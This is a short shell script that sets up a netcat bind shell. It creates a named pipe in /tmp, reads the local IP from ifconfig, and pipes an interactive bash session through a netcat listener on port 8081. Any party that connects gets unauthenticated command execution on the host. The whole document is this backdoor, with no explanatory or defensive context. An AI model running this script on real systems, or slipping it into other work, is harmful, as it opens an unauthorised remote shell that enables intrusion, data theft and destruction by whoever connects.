#!/bin/sh

rm -f /tmp/conect; mkfifo /tmp/conect
ip=`ifconfig | grep Bcast  | awk '{print $2}' | cut -d: -f2`
cat /tmp/conect | /bin/bash -i 2>&1 | nc -vl  $ip 8081  > /tmp/conect
